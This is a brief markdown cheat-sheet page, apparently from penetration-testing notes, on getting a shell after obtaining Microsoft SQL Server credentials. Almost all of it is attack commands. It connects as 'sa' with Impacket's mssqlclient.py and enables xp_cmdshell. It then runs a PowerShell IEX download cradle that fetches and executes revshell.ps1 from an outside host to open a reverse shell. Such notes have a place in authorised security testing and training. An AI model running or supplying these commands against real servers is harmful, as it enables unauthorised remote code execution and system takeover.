---
description: Obtaining a shell after obtaining credentials to a Microsoft SQL Server.
---

# Microsoft SQL Server

```bash
# Connect to the Microsoft SQL Server using Impacekt's mssqlclient.py:
python3 mssqlclient.py sa@$ip

# Configure xp_cmdshell to be enabled:
sp_configure 'xp_cmdshell', '1'; RECONFIGURE

# Enable code execution using xp_cmdshell:
enable_xp_cmdshell 

# Example of obtaining a reverse shell:
xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://$ip:8080/revshell.ps1\")
```
